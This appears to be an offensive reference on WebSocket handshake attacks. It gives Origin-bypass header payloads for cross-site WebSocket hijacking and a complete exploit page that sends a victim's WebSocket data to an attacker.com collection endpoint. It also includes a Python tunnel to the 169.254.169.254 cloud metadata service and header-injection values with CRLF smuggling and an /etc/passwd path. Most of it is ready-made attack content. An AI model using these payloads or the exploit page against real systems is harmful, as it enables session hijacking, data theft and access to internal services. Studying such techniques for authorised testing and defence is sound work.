# Handshake Attacks — Deep Reference

## RFC 6455 Handshake Mechanics

The WebSocket handshake is an HTTP/1.1 upgrade. The client sends:
```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

Server responds with 101 if accepting:
```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

`Sec-WebSocket-Accept` = base64(SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))

Critical security reality: browsers send cookies automatically with the upgrade request.
The Same-Origin Policy does NOT restrict WebSocket connections — only XMLHttpRequest/fetch.
This is the root cause of CSWSH.

---

## CSWSH — Exhaustive Test Matrix

### Origin Header Absence
Remove `Origin` header entirely. Many servers only check if it's present and wrong, not if it's absent.
```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: abc123==
Sec-WebSocket-Version: 13
[NO ORIGIN HEADER]
```
Expected secure behavior: 403 Forbidden
Vulnerable: 101 Switching Protocols

### Null Origin
`Origin: null` is sent by sandboxed iframes (`<iframe sandbox>`).
```
Origin: null
```
Many whitelist validators fail to handle `null` and either accept or crash.

### Reflective Origin / No Validation
Change Origin to attacker domain:
```
Origin: https://evil.com
Origin: https://attacker.com
```
If server reflects back `101`, no validation exists.

### Regex Bypass Patterns
These exploit weak allowlist implementations:

```
Origin: https://target.com.evil.com          # suffix match bypass
Origin: https://evil.com/target.com          # path-based confusion
Origin: https://eviltarget.com               # substring match bypass
Origin: https://target.com%60.evil.com       # URL-encoding bypass
Origin: https://target.com@evil.com          # @ confusion
Origin: https://target.com?.evil.com         # query string confusion
Origin: null                                 # sandbox bypass
Origin: https://TARGET.COM                   # case sensitivity
Origin: https://target.com:80               # non-standard port bypass
Origin: http://target.com                   # scheme downgrade
```

### CSRF Token Absence in Handshake
If the only auth is cookie-based (no CSRF token in query param or custom header):
- Any cross-origin page can establish the WS connection with victim's session
- CSWSH is exploitable even if Origin validation exists (can be bypassed via CORS misconfiguration on the parent page)

### SameSite Cookie Bypass
Even with `SameSite=Lax` cookies, the upgrade request is a GET, which Lax allows cross-site.
`SameSite=Strict` is the only cookie setting that blocks CSWSH.

---

## CSWSH Attack Delivery

### Browser-Side Exploit Page
```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
var exfil = "https://attacker.com/collect?data=";
var ws = new WebSocket("wss://victim.com/ws");

ws.onopen = function() {
    // Request sensitive data the server pushes on connect
    ws.send(JSON.stringify({"action": "get_profile"}));
    ws.send(JSON.stringify({"action": "list_messages"}));
};

ws.onmessage = function(event) {
    // Exfiltrate via image request (bypasses CORS)
    new Image().src = exfil + encodeURIComponent(event.data);
    // Also send to controlled endpoint
    fetch(exfil, {method: "POST", body: event.data, mode: "no-cors"});
};

ws.onerror = function(e) {
    new Image().src = exfil + "error=" + encodeURIComponent(e.toString());
};
</script>
<h1>Loading...</h1>
</body>
</html>
```

### High-Impact CSWSH Scenarios
1. **Private data retrieval**: Server pushes user's messages/notifications on connect
2. **State-changing actions**: Chat post forgery, purchase, password change via WS action
3. **Token harvesting**: Server sends CSRF tokens or API keys in first WS message
4. **Session riding**: All authenticated actions replicated via the hijacked connection

---

## Protocol Smuggling via WebSocket Upgrade

### WAF/Proxy Bypass via Upgrade
HTTP proxies and WAFs inspect HTTP traffic. Once WebSocket upgrade succeeds, most proxies treat subsequent frames as opaque binary — not HTTP. Use this to:

1. Bypass WAF rules for payload delivery (SQLi, XSS) after upgrade
2. Access internal services by requesting internal hostnames in the upgrade Host header
3. Bypass IP-based restrictions on internal endpoints

### HTTP Tunneling Through WebSocket
Some servers expose an internal HTTP proxy via WebSocket (like NoVNC, shell-in-a-box):
```python
import websocket, base64

ws = websocket.create_connection("wss://target.com/websockify")
# Construct raw HTTP request to tunnel to internal service
http_req = b"GET http://169.254.169.254/latest/meta-data/ HTTP/1.0\r\n\r\n"
ws.send_binary(http_req)
print(ws.recv())
```

### XSS-to-Internal-Service Attack
If XSS exists on the web app AND a WS endpoint tunnels TCP:
1. Inject JS that opens the WS tunnel
2. Send raw requests to localhost services (Redis, memcached, internal APIs)
3. Exfiltrate responses via the existing XSS channel

---

## Header Injection & Manipulation

### Sec-WebSocket-Protocol Injection
```
Sec-WebSocket-Protocol: chat, legitimate\r\nX-Injected: value
Sec-WebSocket-Protocol: ../../../../etc/passwd
```

### Sec-WebSocket-Extensions Manipulation
```
# Force permessage-deflate (if server disallows, this may fail → confirms compression disabled)
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=15; server_max_window_bits=15

# Test header injection
Sec-WebSocket-Extensions: permessage-deflate\r\nEvil: header

# Disable compression to test CRIME/BREACH-like oracle
Sec-WebSocket-Extensions: [remove entirely]
```

### Old Protocol Version Forcing
Hixie-76 and hybi-00 have known security vulnerabilities:
```
Sec-WebSocket-Version: 0
Sec-WebSocket-Version: 76
```
If server accepts, test for Hixie-specific attacks (masking not enforced, handshake predictable).

### Key Collision Attack
The `Sec-WebSocket-Accept` value is deterministic given the key.
Test servers that re-use or don't validate the Accept header:
```
Sec-WebSocket-Key: AAAAAAAAAAAAAAAAAAAAAA==   # all-zeros key
```

---

## Upgrade Request Fingerprinting Cheatsheet

| Header | Presence | Meaning |
|---|---|---|
| `Sec-WebSocket-Protocol: socket.io` | Yes | Socket.IO detected |
| `Sec-WebSocket-Protocol: stomp` | Yes | STOMP/Spring detected |
| `Sec-WebSocket-Protocol: wamp.2.json` | Yes | WAMP v2 detected |
| `Sec-WebSocket-Extensions: permessage-deflate` | Yes | Compression enabled → Zlib bomb viable |
| `?EIO=4` | In URL | Socket.IO v4 |
| `?EIO=3` | In URL | Socket.IO v3 |
| `?transport=websocket` | In URL | Socket.IO transport param |
